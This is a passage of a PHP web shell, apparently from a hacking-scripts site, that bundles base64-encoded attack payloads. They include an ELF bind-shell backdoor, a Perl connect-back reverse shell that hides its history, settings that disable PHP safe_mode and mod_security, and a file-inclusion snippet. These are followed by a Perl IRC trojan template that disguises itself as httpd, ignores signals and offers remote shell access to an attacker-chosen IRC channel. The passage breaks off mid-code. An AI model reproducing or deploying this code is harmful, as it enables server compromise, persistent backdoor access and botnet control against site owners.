DApIHskdGJ1ZmZlciA9IHN1YnN0cigkdGJ1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfQ0Kd2hpbGUgKG15ICRs
ZW4gPSBsZW5ndGgoJGNidWZmZXIpKSB7DQpteSAkcmVzID0gc3lzd3JpdGUoJGNoLCAkY2J1ZmZlciwgJGxlbik7DQppZiAoJHJlcyA+IDApIHskY2J
1ZmZlciA9IHN1YnN0cigkY2J1ZmZlciwgJHJlcyk7fSANCmVsc2Uge3ByaW50IFNUREVSUiAiJCFcbiI7fQ0KfX19DQo=";
$port_bind_bd_cs="f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAoIUECDQAAAD4EgAAAAAAADQAIAAHACgAIgAfAAYAAAA0AAAANIAECDSABAjgAAAA4AAAAAUAAAAEAAAAAwAAABQBAAAUgQQIFIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQIrAkAAKwJAAAFAAAAABAAAAEAAACsCQAArJkECKyZBAg0AQAAOAEAAAYAAAAAEAAAAgAAAMAJAADAmQQIwJkECMgAAADIAAAABgAAAAQAAAAEAAAAKAEAACiBBAgogQQIIAAAACAAAAAEAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAEAAAAL2xpYi9sZC1saW51eC5zby4yAAAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAACAAAAAAAAABEAAAATAAAAAAAAAAAAAAAQAAAAEQAAAAAAAAAAAAAACQAAAAgAAAAFAAAAAwAAAA0AAAAAAAAAAAAAAA8AAAAKAAAAEgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAABAAAAAAAAAAcAAAALAAAAAAAAAAQAAAAMAAAADgAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC4AAAAAAAAAdQEAABIAAACgAAAAAAAAAHEAAAASAAAANAAAAAAAAADMAAAAEgAAAGoAAAAAAAAAWgAAABIAAABMAAAAAAAAAHgAAAASAAAAYwAAAAAAAAA5AAAAEgAAAFgAAAAAAAAAOQAAABIAAACOAAAAAAAAAOYAAAASAAAAOwAAAAAAAAA6AAAAEgAAAFMAAAAAAAAAOQAAABIAAAB1AAAAAAAAALkAAAASAAAAegAAAAAAAAArAAAAEgAAAEcAAAAAAAAAeAAAABIAAABvAAAAAAAAAA4AAAASAAAAfwAAAEiJBAgEAAAAEQAOAEAAAAAAAAAAOQAAABIAAAABAAAAAAAAAAAAAAAgAAAAFQAAAAAAAAAAAAAAIAAAAABfSnZfUmVnaXN0ZXJDbGFzc2VzAF9fZ21vbl9zdGFydF9fAGxpYmMuc28uNgBleGVjbABwZXJyb3IAZHVwMgBzb2NrZXQAc2VuZABhY2NlcHQAYmluZABzZXRzb2Nrb3B0AGxpc3RlbgBmb3JrAGh0b25zAGV4aXQAYXRvaQBfSU9fc3RkaW5fdXNlZABfX2xpYmNfc3RhcnRfbWFpbgBjbG9zZQBHTElCQ18yLjAAAAACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAQACAAAAAAAAAAEAAQAkAAAAEAAAAAAAAAAQaWkNAAACAKYAAAAAAAAAiJoECAYSAACYmgQIBwEAAJyaBAgHAgAAoJoECAcDAACkmgQIBwQAAKiaBAgHBQAArJoECAcGAACwmgQIBwcAALSaBAgHCAAAuJoECAcJAAC8mgQIBwoAAMCaBAgHCwAAxJoECAcMAADImgQIBw0AAMyaBAgHDgAA0JoECAcQAABVieWD7AjoMQEAAOiDAQAA6FsEAADJwwD/NZCaBAj/JZSaBAgAAAAA/yWYmgQIaAAAAADp4P////8lnJoECGgIAAAA6dD/////JaCaBAhoEAAAAOnA/////yWkmgQIaBgAAADpsP////8lqJoECGggAAAA6aD/////JayaBAhoKAAAAOmQ/////yWwmgQIaDAAAADpgP////8ltJoECGg4AAAA6XD/////JbiaBAhoQAAAAOlg/////yW8mgQIaEgAAADpUP////8lwJoECGhQAAAA6UD/////JcSaBAhoWAAAAOkw/////yXImgQIaGAAAADpIP////8lzJoECGhoAAAA6RD/////JdCaBAhocAAAAOkA////Me1eieGD5PBQVFJorYgECGhciAQIUVZoQIYECOhf////9JCQVYnlU+gbAAAAgcO/FAAAg+wEi4P8////hcB0Av/Qg8QEW13Dixwkw1WJ5YPsCIA94JoECAB0DOscg8AEo9yaBAj/0qHcmgQIixCF0nXrxgXgmgQIAcnDVYnlg+wIobyZBAiFwHQSuAAAAACFwHQJxwQkvJkECP/QycOQkFWJ5VeD7GSD5PC4AAAAAIPAD4PAD8HoBMHgBCnEx0XkAQAAAMdF+EyJBAjHRCQIAAAAAMdEJAQBAAAAxwQkAgAAAOgJ////iUXwg33wAHkYxwQkjIkECOg0/v//xwQkAQAAAOio/v//ZsdF1AIAx0XYAAAAAItFDIPABIsAiQQk6Jv+//8Pt8CJBCTosP7//2aJRdbHRCQQBAAAAI1F5IlEJAzHRCQIAgAAAMdEJAQBAAAAi0XwiQQk6BL+//+NRdTHRCQIEAAA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L2NydG4uUwAxLmMAX0RZTkFNSUMAX19maW5pX2FycmF5X2VuZABfX2ZpbmlfYXJyYXlfc3RhcnQAX19pbml0X2FycmF5X2VuZABfR0xPQkFMX09GRlNFVF9UQUJMRV8AX19pbml0X2FycmF5X3N0YXJ0AGV4ZWNsQEBHTElCQ18yLjAAY2xvc2VAQEdMSUJDXzIuMABfZnBfaHcAcGVycm9yQEBHTElCQ18yLjAAZm9ya0BAR0xJQkNfMi4wAF9fZHNvX2hhbmRsZQBfX2xpYmNfY3N1X2ZpbmkAYWNjZXB0QEBHTElCQ18yLjAAX2luaXQAbGlzdGVuQEBHTElCQ18yLjAAc2V0c29ja29wdEBAR0xJQkNfMi4wAF9zdGFydABfX2xpYmNfY3N1X2luaXQAX19ic3Nfc3RhcnQAbWFpbgBfX2xpYmNfc3RhcnRfbWFpbkBAR0xJQkNfMi4wAGR1cDJAQEdMSUJDXzIuMABkYXRhX3N0YXJ0AGJpbmRAQEdMSUJDXzIuMABfZmluaQBleGl0QEBHTElCQ18yLjAAYXRvaUBAR0xJQkNfMi4wAF9lZGF0YQBfX2k2ODYuZ2V0X3BjX3RodW5rLmJ4AF9lbmQAc2VuZEBAR0xJQkNfMi4wAGh0b25zQEBHTElCQ18yLjAAX0lPX3N0ZGluX3VzZWQAX19kYXRhX3N0YXJ0AHNvY2tldEBAR0xJQkNfMi4wAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19nbW9uX3N0YXJ0X18A";
$back_connects="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KaWYgKCEkQVJHVlswXSkgew0KICBwcmludGYgIlVzYWdlOiAkMCBbSG9zdF0gPFBvcnQ+XG4iOw0KICBleGl0KDEpOw0KfQ0KcHJpbnQgIlsqXSBEdW1waW5nIEFyZ3VtZW50c1xuIjsNCiRob3N0ID0gJEFSR1ZbMF07DQokcG9ydCA9IDgwOw0KaWYgKCRBUkdWWzFdKSB7DQogICRwb3J0ID0gJEFSR1ZbMV07DQp9DQpwcmludCAiWypdIENvbm5lY3RpbmcuLi5cbiI7DQokcHJvdG8gPSBnZXRwcm90b2J5bmFtZSgndGNwJykgfHwgZGllKCJVbmtub3duIFByb3RvY29sXG4iKTsNCnNvY2tldChTRVJWRVIsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCAkcHJvdG8pIHx8IGRpZSAoIlNvY2tldCBFcnJvclxuIik7DQpteSAkdGFyZ2V0ID0gaW5ldF9hdG9uKCRob3N0KTsNCmlmICghY29ubmVjdChTRVJWRVIsIHBhY2sgIlNuQTR4OCIsIDIsICRwb3J0LCAkdGFyZ2V0KSkgew0KICBkaWUoIlVuYWJsZSB0byBDb25uZWN0XG4iKTsNCn0NCnByaW50ICJbKl0gU3Bhd25pbmcgU2hlbGxcbiI7DQppZiAoIWZvcmsoICkpIHsNCiAgb3BlbihTVERJTiwiPiZTRVJWRVIiKTsNCiAgb3BlbihTVERPVVQsIj4mU0VSVkVSIik7DQogIG9wZW4oU1RERVJSLCI+JlNFUlZFUiIpOw0KICBwcmludCAiLS09PSBDb25uZWN0QmFjayBCYWNrZG9vciB2cyAxLjAgYnkgU25JcEVyX1NBIHNuaXBlci1zYS5jb20gPT0tLSAgXG5cbiI7IA0Kc3lzdGVtKCJ1bnNldCBISVNURklMRTsgdW5zZXQgU0FWRUhJU1QgO2VjaG8gLS09PVN5c3RlbWluZm89PS0tIDsgdW5hbWUgLWE7ZWNobzsNCmVjaG8gLS09PVVzZXJpbmZvPT0tLSA7IGlkO2VjaG87ZWNobyAtLT09RGlyZWN0b3J5PT0tLSA7IHB3ZDtlY2hvOyBlY2hvIC0tPT1TaGVsbD09LS0gIik7IA0KICBleGVjIHsnL2Jpbi9zaCd9ICctYmFzaCcgLiAiXDAiIHggNDsNCiAgZXhpdCgwKTsNCn0=";
$php_ini1="c2FmZV9tb2RlICAgICAgICAgICAgICAgPSAgICAgICBPZmY=";
$htacces="PElmTW9kdWxlIG1vZF9zZWN1cml0eS5jPg0KICAgIFNlY0ZpbHRlckVuZ2luZSBPZmYNCiAgICBTZWNGaWx0ZXJTY2FuUE9TVCBPZmYNCjwvSWZNb2R1bGU+";
$sni_res="PD8NCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsiZmlsZSJdKTsNCmluaV9yZXN0b3JlKCJzYWZlX21vZGUiKTsNCmluaV9yZXN0b3JlKCJvcGVuX2Jhc2VkaXIiKTsNCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsic3MiXSk7DQo/Pg==";
if(!empty($_POST['ircadmin']) AND !empty($_POST['ircserver']) AND !empty($_POST['ircchanal']) AND !empty($_POST['ircname']))
{
$ircadmin=$_POST['ircadmin'];
$ircserver=$_POST['ircserver'];
$ircchan=$_POST['ircchanal'];
$irclabel=$_POST['ircname'];
echo "&lt;title&gt;OverclockiX Shell-Connector || Connecting to $ircserver&lt;title&gt;";
echo "&lt;body bgcolor=\"black\" text=\"green\"&gt;";
echo "Now Connecting to &lt;b&gt;&lt;font color=\"red\"&gt;$ircserver&lt;/font&gt;&lt;/b&gt; in &lt;b&gt;&lt;font color=\"yellow\"&gt;$ircchan&lt;/font&gt;&lt;/b&gt; Andministrators: &lt;b&gt;&lt;font color=\"yellow\"&gt;$ircadmin&lt;/font&gt;&lt;/b&gt; Botname is &lt;b&gt;&lt;font color=\"yellow\"&gt;$irclabel&lt;/font&gt;&lt;/b&gt;";
echo "&lt;p&gt;Dont Forget to Delete Loader.pl in /tmp&lt;/p&gt;";
#######################################################
######################IRC Trojan##########################
$file="
################ CONFIGURACAO #################################################################
my \$processo = '/usr/local/apache/bin/httpd -DSSL'; # Nome do processo que vai aparece no ps #
#----------------------------------------------################################################
my \$linas_max='48'; # Evita o flood <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> depois de X linhas #
#----------------------------------------------################################################
my \$sleep='4'; # ele dorme X segundos #
##################### IRC #####################################################################
my @adms=(\"$ircadmin\"); # Nick do administrador #
#----------------------------------------------################################################
my @canais=(\"$ircchan\"); # Caso haja senha (\"#canal :senha\") #
#----------------------------------------------################################################
my \$nick='$irclabel'; # Nick do bot. Caso esteja em uso vai aparecer #
                                               # aparecer com numero radonamico no final #
#----------------------------------------------################################################
my \$ircname = 'Linux'; # User ID #
#----------------------------------------------################################################
chop (my \$realname = `uname -a`); # Full Name #
#----------------------------------------------################################################
\$servidor='$ircserver' unless \$servidor; # Servidor de irc que vai ser usado #
                                               # caso n?o seja especificado no argumento #
#----------------------------------------------################################################
my \$porta='6667'; # Porta do servidor de irc #
################ ACESSO A SHELL ###############################################################
my \$secv = 1; # 1/0 pra habilita/desabilita acesso a shell #
###############################################################################################
my \$VERSAO = '0.2';
\$SIG{'INT'} = 'IGNORE';
\$SIG{'HUP'} = 'IGNORE';
\$SIG{'TERM'} = 'IGNORE';
\$SIG{'CHLD'} = 'IGNORE';
\$SIG{'PS'} = 'IGNORE';
\$SIG{'STOP'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir(\"/\");
\$servidor=\"\$ARGV[0]\" if \$ARGV[0];
$0=\"\$processo\".\"&#92;&#48;\"x16;;
my \$pid=fork;
exit if \$pid;
die \"Problema com o fork: $!\" unless defined(\$pid);
my \$dcc_sel = new IO::Select-&gt;new();
#############################
# B0tchZ na veia ehehe <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_razz.gif" alt=":P" class="wp-smiley" /> #
#############################
\$sel_cliente = IO::Select-&gt;new();
sub sendraw {
  if ($#_ == '1') {
    my \$socket = \$_[0];
    print \$socket \"\$_[1]\\n\";
  } else {
      print \$IRC_cur_socket \"\$_[0]\\n\";
  }
}
#################################
sub conectar {
   my \$meunick = \$_[0];
   my \$servidor_con = \$_[1];
   my \$porta_con = \$_[2];
   my \$IRC_socket = IO::Socket::INET-&gt;new(Proto=&gt;\"tcp\", PeerAddr=&gt;\"\$servidor_con\", PeerPort=&gt;\$porta_con) or return(1);
   if (defined(\$IRC_socket)) {
     \$IRC_cur_socket = \$IRC_socket;
     \$IRC_socket-&gt;autoflush(1);
     \$sel_cliente-&gt;add(\$IRC_socket);
     \$irc_servers{\$IRC_cur_socket}{'host'} = \"\$servidor_con\";
     \$irc_servers{\$IRC_cur_socket}{'porta'} = \"\$porta_con\";
     \$irc_servers{\$IRC_cur_socket}{'nick'} = \$meunick;
     \$irc_servers{\$IRC_cur_socket}{'meuip'} = \$IRC_socket-&gt;sockhost;
     nick(\"\$meunick\");
     sendraw(\"USER \$ircname \".\$IRC_socket-&gt;sockhost.\" \$servidor_con :\$realname\");
     sleep 1;
   }
} #####################
my \$line_temp;
while( 1 ) {
